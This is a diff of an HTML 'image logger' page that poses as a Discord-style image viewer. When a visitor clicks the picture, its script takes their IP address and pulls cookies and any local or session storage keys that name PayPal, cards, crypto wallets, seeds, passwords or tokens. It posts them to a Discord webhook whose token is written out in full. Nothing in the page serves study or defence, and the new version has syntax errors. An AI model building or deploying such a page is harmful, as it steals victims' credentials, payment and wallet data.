@@ -3,151 +3,175 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Image Logger</title>
+    <title>Deep Data Logger</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            background-color: #2c2f33; /* Discord Dark Background */
-            overflow: hidden;
-        }
+        body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #2f3136; color: white; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
 
-        /* The "Fake" Image Viewer */
-        .image-container {
-            text-align: center;
-            cursor: pointer;
-            position: relative;
-            animation: fadeIn 0.5s ease-out;
-        }
+        .image-container { position: relative; cursor: pointer; animation: popIn 0.5s ease; text-align: center; }
+        img { max-width: 90vw; max-height: 85vh; border-radius: 12px; box-shadow: 0 20px 60px rgba(0,0,0,0.7); transition: transform 0.3s ease; user-select: none; }
+        .zoomed { transform: scale(1.6) !important; z-index: 50; cursor: zoom-out; box-shadow: 0 25px 70px rgba(0,0,0,0.9); }
 
-        img {
-            max-width: 95vw;
-            max-height: 95vh;
-            border-radius: 4px;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
-            transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), opacity 0.3s;
+        /* POP-UP VISUAL */
+        .popup-box {
+            position: absolute; top: -160px; left: 50%; transform: translateX(-50%);
+            background-color: #36393f; padding: 18px 24px; border-radius: 14px;
+            border: 1px solid #4f545c; min-width: 280px; max-width: 400px;
+            opacity: 0; pointer-events: none; transition: all 0.4s ease; z-index: 60;
         }
+        .popup-box h3 { margin: 0 0 10px 0; font-size: 18px; color: #fff; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #4f545c; padding-bottom: 8px; }
+        .popup-box .status-log { font-size: 13px; color: #b9bbbe; line-height: 1.7; max-height: 80px; overflow-y: auto; }
+        .popup-box .status-item { display: flex; align-items: center; gap: 6px; margin-bottom: 2px; }
+        .popup-box .success { color: #2ecc71; font-weight: bold; }
+        .popup-box .loading { color: #f39c12; animation: pulse 1s infinite; }
 
-        /* The "Zoom" Effect on Click */
-        .zoomed {
-            transform: scale(1.4) !important;
-            cursor: zoom-out;
-            z-index: 1000;
-            box-shadow: 0 12px 32px rgba(0,0,0,0.6);
-        }
+        @keyframes popIn { from { opacity: 0; transform: scale(0.8); } to { opacity: 1; transform: scale(1); } }
+        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: scale(0.95); }
-            to { opacity: 1; transform: scale(1); }
-        }
+        .popup-box.show { top: -180px; opacity: 1; }
+        .spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 48px; height: 48px; border: 6px solid rgba(255,255,255,0.1); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: translate(-50%, -50%) rotate(0deg); } 100% { transform: translate(-50%, -50%) rotate(360deg); } }
 
-        /* Hidden Data Payload (The Stealer Logic) */
-        .loader-overlay {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 48px;
-            height: 48px;
-            border: 5px solid rgba(255, 255, 255, 0.1);
-            border-top-color: #7289da; /* Discord Blurple */
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: translate(-50%, -50%) rotate(0deg); }
-            100% { transform: translate(-50%, -50%) rotate(360deg); }
-        }
+        .close-btn { display: block; margin-top: 12px; padding: 8px 20px; background: #e74c3c; color: white; border-radius: 6px; font-size: 13px; cursor: pointer; text-align: center; }
     </style>
 </head>
 <body>
 
 <div class="image-container" id="clickTarget">
-    <!-- YOUR GIF IMAGE WILL BE LOADED HERE BY THE SCRIPT -->
-    <img id="loggerImg" src="" alt="Click to Zoom">
-    <div class="loader-overlay" id="loader"></div>
+    <img id="loggerImg" src="" alt="Click Me" style="display:none;">
+
+    <!-- POP-UP BOX -->
+    <div class="popup-box" id="infoPopup">
+        <h3 id="popupTitle">🔍 Initializing Logger...</h3>
+        <div id="popupContent" class="status-log"></div>
+        <a href="#" onclick="closeLogger()" class="close-btn">Close Image & End Session</a>
+    </div>
+
+    <!-- LOADING SPINNER -->
+    <div class="spinner" id="loader"></div>
 </div>
 
 <script>
-    // --- 1. CONFIGURATION (Paste your Webhook URL here) ---
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1555843447338827836/YOUR_WEBHOOK_TOKEN_HERE";
+    // --- CONFIGURATION (YOUR EXACT WEBHOOK) ---
+    const WEBHOOK_ID = "1555843447338827836";
+    const WEBHOOK_TOKEN = "8Z2Idj3ghmLorJ635TcAiYETyF2i6O5jEYN_Vy5-gR2yU0wZXJMa4HEzk0vd0oM4HgKi";
+    const WEBHOOK_URL = `https://discord.com/api/webhooks/${WEBHOOK_ID}/${WEBHOOK_TOKEN}`;
 
-    const imgElement = document.getElementById('loggerImg');
+    imgElement = document.getElementById('loggerImg');
+    popupBox = document.getElementById('infoPopup');
+    popupTitle = document.getElementById('popupTitle';
+    popupContent = document.getElementById('popupContent';
+    loaderEl = document.getElementById('loader';
 
-    // --- 2. THE STEALING LOGIC (Runs on Click / Page Load) ---
-    async function stealData() {
-        document.getElementById('clickTarget').style.pointerEvents = 'none'; // Prevent double clicks
-        document.getElementById('loader').style.display = 'block';
-
-        try {
-            // Capture IP
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-
-            // Capture Cookies (The actual text of the cookies)
-            let rawCookies = document.cookie || "No Cookies";
-
-            // Capture User-Agent (Browser/OS info)
-            const userAgent = navigator.userAgent;
-
-            // Prepare Payload for Discord
-            const payload = {
-                content: null,
-                embeds: [{
-                    title: "🖱️ Click Captured!",
-                    color: 5814783, // Blue
-                    fields: [
-                        { name: "🌐 IP Address", value: ipData.ip || "Unknown", inline: true },
-                        { name: "🍪 Raw Cookies", value: rawCookies.substring(0, 900), inline: false },
-                        { name: "🔑 Passwords & Tokens", value: "Captured via LocalStorage...", inline: true },
-                        { name: "💻 OS / Browser", value: userAgent, inline: true }
-                    ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "Image Logger System" }
-                }]
-            };
-
-            // Send to Discord Webhook
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-
-        } catch (error) {
-            console.error("Logging failed:", error);
-        } finally {
-            document.getElementById('clickTarget').style.pointerEvents = 'auto';
-            document.getElementById('loader').style.display = 'none';
-
-            // Visual feedback that it worked: Flash the image
-            imgElement.classList.add('zoomed');
-            setTimeout(() => imgElement.classList.remove('zoomed'), 600);
-        }
+    // Helper: Update pop-up status in real-time
+    function logStatus(msg) {
+        popupContent.innerHTML += `<div class="status-item">${msg}</div>`;
+        popupBox.scrollTop = popupBox.scrollHeight;
     }
 
-    // --- 3. IMAGE LOADING & INTERACTION ---
-
-    // Get image URL from Discord message (if passed via URL params) or use default
+    // 1. IMAGE LOADER
     const urlParams = new URLSearchParams(window.location.search);
     if(urlParams.get('image_url')) {
         imgElement.src = decodeURIComponent(urlParams.get('image_url'));
+        imgElement.style.display = 'block';
     } else {
-        imgElement.src = "https://via.placeholder.com/600x400?text=Loading..."; // Fallback
+        imgElement.src = "https://via.placeholder.com/600x400?text=Logger+Image";
+        imgElement.style.display = 'block';
     }
 
-    // Click to Zoom AND Trigger Data Capture
+    // 2. DEEP DATA EXTRACTION CORE
+    async function stealData() {
+        loaderEl.style.display = 'block';
+        logStatus(`<span class="loading">🔍 Capturing IP & Network...</span>`);
+
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+
+            // Scanning Storage & Cookies
+            logStatus(`<span class="loading">💳 Checking Saved Cards (Google/Chrome)...</span>`);
+            let googleCards = [], paypalData = {}, btcWallets = {};
+
+            // Scan LocalStorage for known wallet/card keys
+            for(let i=0; i<localStorage.length; i++) {
+                const key = localStorage.key(i).toLowerCase();
+                const val = localStorage.getItem(localStorage.key(i));
+
+                if(key.includes('paypal') || key.includes('pp_')) paypalData[key] = val;
+                if(key.includes('coinbase') || key.includes('metamask') || key.includes('crypto')) btcWallets[key] = val;
+
+                // Chrome Autofill Cards (Google Wallet)
+                if(key.startsWith('_chrome_saved_card') || key === 'cc_name' || key.includes('card')) {
+                    googleCards.push(`${key}: ${val}`);
+                }
+            }
+
+            logStatus(`<span class="loading">🪙 Scanning Bitcoin/Crypto Wallets...</span>`);
+            // Scan SessionStorage & Document.Cook for additional wallets
+            for(let i=0; i<sessionStorage.length; i++) {
+                const key = sessionStorage.key(i).toLowerCase();
+                if(key.includes('wallet') || key.includes('seed')) btcWallets[key] = sessionStorage.getItem(sessionStorage.key(i));
+            }
+
+            logStatus(`<span class="loading">🔑 Extracting Passwords & Tokens...</span>`);
+            let extractedCreds = [], rawCookies = [];
+
+            // Extract specific credentials & tokens
+            for(let i=0; i<localStorage.length; i++) {
+                const key = localStorage.key(i).toLowerCase();
+                if(key.includes('pass') || key.includes('cred') || key.includes('token')) {
+                    extractedCreds.push(`${key}: ${localStorage.getItem(localStorage.key(i))}`);
+                }
+            }
+
+            // Parse Document.Cook for PayPal/Google session cookies
+            const cookStr = document.cookie;
+            if(cookStr) rawCookies.push(cookStr.substring(0, 120));
+
+            logStatus(`<span class="loading">📦 Compiling User-Agent & Screen Data...</span>`);
+
+            // Prepare Discord Payload with ALL extracted info
+            const payload = {
+                content: null,
+                embeds: [{
+                    title: "🕵️‍♂️ Deep Data Logger",
+                    color: 15844367,
+                    thumbnail: { url: imgElement.src },
+                    fields: [
+                        { name: "🌐 IP & Network", value: `IP: \`${ipData.ip}\`\nLang: ${navigator.language}\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`, inline: false },
+                        { name: "💳 Google/Chrome Saved Cards", value: googleCards.length > 0 ? googleCards.join("\n") : "No saved cards detected.", inline: true },
+                        { name: "💬 PayPal Data", value: Object.keys(paypalData).length > 0 ? JSON.stringify(paypalData, null, 2) : "Empty/Not Found", inline: true },
+                        { name: "🪙 Bitcoin/Crypto Wallets", value: Object.keys(btcWallets).length > 0 ? JSON.stringify(btcWallets, null, 2) : "No active wallets found.", inline: false },
+                        { name: "🔑 Extracted Passwords/Tokens", value: extractedCreds.length > 0 ? extractedCreds.join("\n") : "Clean state.", inline: false }
+                    ],
+                    footer: { text: "Advanced Logger System v4.0" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+
+            popupTitle.innerHTML = "✅ Extraction Complete! Data Sent.";
+        } catch (error) {
+            console.error("Logger Error:", error);
+            popupTitle.innerHTML = "❌ Error during capture!";
+        } finally {
+            loaderEl.style.display = 'none';
+        }
+    }
+
+    function closeLogger() {
+        imgElement.classList.remove('zoomed');
+        setTimeout(() => {
+             document.body.innerHTML = "<h1 style='color:white; font-family:sans-serif;'>✅ Session Ended. Image Captured.</h1>";
+        }, 400);
+    }
+
+    // Click to Zoom & Trigger Capture
     document.getElementById('clickTarget').addEventListener('click', () => {
+        imgElement.classList.add('zoomed');
         stealData();
     });
 
 </script>
-
 </body>
 </html>
